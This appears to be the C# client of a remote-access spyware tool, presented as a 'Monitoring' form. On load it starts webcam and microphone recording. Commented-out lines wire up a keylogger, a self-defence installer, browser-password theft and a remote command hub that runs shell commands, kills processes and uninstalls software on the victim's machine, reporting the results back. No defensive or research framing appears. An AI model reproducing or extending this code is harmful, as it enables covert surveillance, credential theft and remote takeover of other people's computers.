using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Module_Internet_Reporter;
using System.Reflection;
using System.Management;
using Module_Internet_Reporter.Communication_Manager;
using Module_Out_Communication_Manager;
using Module_System_Inforamtion;
using Module_Process_Manager;
using Module_Process_Manager.Response;
using Module_Software_Manager.Response;
using System.IO;

namespace Monitoring
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        _m_Out_Communication_Manager mocm;
        private void Form1_Load(object sender, EventArgs e)
        {
            Module_WebCam_Microphone_Capture.Module_WebCam_Microphone_Capture mwmc = new Module_WebCam_Microphone_Capture.Module_WebCam_Microphone_Capture();
            mwmc.MaxSizeLimit = 100;
            mwmc.OnStartRecordWebcamAndVoice(true,true);
            //Module_Keylogger.Module_Keylogger mk = new Module_Keylogger.Module_Keylogger();
            //mk.StartHook();
            //Module_SelfDefence.Module_SelfDefence.Install_SelfDefence();

            //Module_Browser_Info.Module_Browser_Info.OnGetAllBrowserPasswords();

            //Module_Internet_Reporter.Internet_Connection_Control._m_Internet_Connection_Disable_Enable.OnGetNetConnectionIdNames();

            //mocm = new _m_Out_Communication_Manager();
            //mocm.Connect();

            //mocm.HubsManager.GetHub("CommandHub").On<string>("OnGetSystemInformation", OnGetSystemInformation);
            //mocm.HubsManager.GetHub("CommandHub").On<string>("OnGetProcessList", OnGetProcessList);
            //mocm.HubsManager.GetHub("CommandHub").On<string,string>("OnExecuteCmd", OnExecuteCmd);
            //mocm.HubsManager.GetHub("CommandHub").On<int, string>("OnKillProcess", OnKillProcess);
            //mocm.HubsManager.GetHub("CommandHub").On<string>("OnStartProcessWatcher", OnStartProcessWatcher);
            //mocm.HubsManager.GetHub("CommandHub").On<string,string>("OnAddProcessToBlackList", OnAddProcessToBlackList);
            //mocm.HubsManager.GetHub("CommandHub").On<string>("OnGetSoftwareList", OnGetSoftwareList);
            //mocm.HubsManager.GetHub("CommandHub").On<string,string,string>("OnSerachSoftware", OnSerachSoftware);
            //mocm.HubsManager.GetHub("CommandHub").On<string, string>("OnUninstallSoftware", OnUninstallSoftware);
        }
        private void OnUninstallSoftware(string UninstallString, string ResponseToOnUninstallSoftware)
        {
            Module_Software_Manager._m_Software_Manager msm = new Module_Software_Manager._m_Software_Manager();
            OnGetSoftwareListResponse UninstalledSoftwareList = msm.OnUninstallSoftware(UninstallString);
            mocm.HubsManager.GetHub("CommandHub").Invoke(ResponseToOnUninstallSoftware, UninstalledSoftwareList);
        }
        private void OnSerachSoftware(string Filter_Key, string Filter_Value,string ResponseToOnSerachSoftware)
        {
            Module_Software_Manager._m_Software_Manager msm = new Module_Software_Manager._m_Software_Manager();
            OnGetSoftwareListResponse SoftwareList = msm.OnSerachSoftware(Filter_Key, Filter_Value);
            mocm.HubsManager.GetHub("CommandHub").Invoke(ResponseToOnSerachSoftware, SoftwareList);
        }
        private void OnGetSoftwareList(string ResponseToOnGetSoftwareList)
        {
            Module_Software_Manager._m_Software_Manager msm = new Module_Software_Manager._m_Software_Manager();
            OnGetSoftwareListResponse SoftwareList = msm.OnGetSoftwareList(); 
            mocm.HubsManager.GetHub("CommandHub").Invoke(ResponseToOnGetSoftwareList, SoftwareList);
        }
        private void OnGetSystemInformation(string ResponseToOnGetSystemInformation)
        {
            string SystemInfo = _m_System_Inforamtion.OnGetSystemInformation().ToString();
            mocm.HubsManager.GetHub("CommandHub").Invoke(ResponseToOnGetSystemInformation, SystemInfo);
        }
        private void OnGetProcessList(string ResponseToOnGetProcessList)
        {
            OnGetProcessListResponse ProcessList = _m_Process_Manager.OnGetProcessList();
            mocm.HubsManager.GetHub("CommandHub").Invoke(ResponseToOnGetProcessList, ProcessList);
        }
        private void OnExecuteCmd(string cmd, string ResponseToOnExecuteCmd)
        {
            string cmdResualt= _m_Process_Manager.OnExecuteCmd(cmd).ToString();
            mocm.HubsManager.GetHub("CommandHub").Invoke(ResponseToOnExecuteCmd, cmdResualt);
        }
        private void OnKillProcess(int ProcessIdToKill, string ResponseToOnKillProcess)
        {
            OnKillProcessResponse killResualt = _m_Process_Manager.OnKillProcess(ProcessIdToKill);
            mocm.HubsManager.GetHub("CommandHub").Invoke(ResponseToOnKillProcess, killResualt);
        }
        private void OnStartProcessWatcher(string ResponseToOnStartProcessWatcher)
        {
            OnStartProcessWatcherResponse StartResualt = _m_Process_Manager.OnStartProcessWatcher();
            mocm.HubsManager.GetHub("CommandHub").Invoke(ResponseToOnStartProcessWatcher, StartResualt);
        }
        private void OnAddProcessToBlackList(string BlackProcess,string ResponseToOnAddProcessToBlackList)
        {
            string resualt = _m_Process_Manager.OnAddProcessToBlackList(BlackProcess).ToString();
            mocm.HubsManager.GetHub("CommandHub").Invoke(ResponseToOnAddProcessToBlackList, resualt);
        }

        private void TimerForPong_Tick(object sender, EventArgs e)
        {
            //if (mocm.connection.State == Microsoft.AspNet.SignalR.Client.ConnectionState.Connected)
            //    mocm.HubsManager.GetHub("CommandHub").Invoke("Pong");
        }
    }
}
